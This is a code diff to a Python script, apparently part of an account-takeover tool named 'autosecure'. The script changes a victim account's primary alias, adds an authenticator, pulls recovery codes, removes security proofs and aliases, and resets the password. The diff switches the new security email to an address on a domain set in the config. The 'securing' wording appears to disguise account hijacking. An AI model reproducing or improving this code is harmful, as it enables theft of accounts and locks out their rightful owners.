@@ -3,7 +3,6 @@ from securing.utils.change_primary_alias import change_primary_alias
 from securing.utils.add_authenticator import add_authenticator
 from securing.utils.get_recovery_code import get_recovery_code
 from securing.utils.remove_services import remove_services
-from securing.utils.generate_email import generate_email
 from securing.utils.get_owner_info import get_owner_info
 from securing.utils.delete_aliases import delete_aliases
 from securing.utils.remove_proof import remove_proof
@@ -34,9 +33,10 @@ async def secure(session: httpx.AsyncClient, recovery: bool, accountInfo: dict):
     # Main file where all processes to securing the account occur
 
     # To auto update if you edit the config via command
-    config = json.load(open("config.json", "r+"))["autosecure"]
-    replace_alias = config["replace_main_alias"]
-    enable_2fa = config["enable_2fa"]
+    config = json.load(open("config.json", "r+"))
+    replace_alias = config["autosecure"]["replace_main_alias"]
+    enable_2fa = config["autosecure"]["enable_2fa"]
+    domain = config["domain"]
     
     apicanary = await get_cookies(session) 
     
@@ -139,6 +139,7 @@ async def secure(session: httpx.AsyncClient, recovery: bool, accountInfo: dict):
 
             # Changes Primary Alias
             if replace_alias:
+                print("[~] - Changing Primary Alias")
                 primaryEmail = f"auto{uuid.uuid4().hex[:12]}"
                 change_alias = await change_primary_alias(session, primaryEmail, apicanary)
                 if change_alias:
@@ -156,14 +157,14 @@ async def secure(session: httpx.AsyncClient, recovery: bool, accountInfo: dict):
             security_email = uuid.uuid4().hex[:16]
             password = uuid.uuid4().hex[:12]
 
-            type, security_email = await generate_email(security_email, password)
+            security_email = f"{security_email}@{domain}"
 
             print(f"[+] - Generated Security Email ({security_email})")
             database.add_security_email(security_email, password)
 
             # Changes password & generate a new recovery code
             print("[~] - Automaticly Securing Account...")
-            data = await recover(session, main_email, recovery_code, security_email, password, type)
+            data = await recover(session, main_email, recovery_code, security_email, password)
 
             # Delete other login aliases
             await delete_aliases(session)
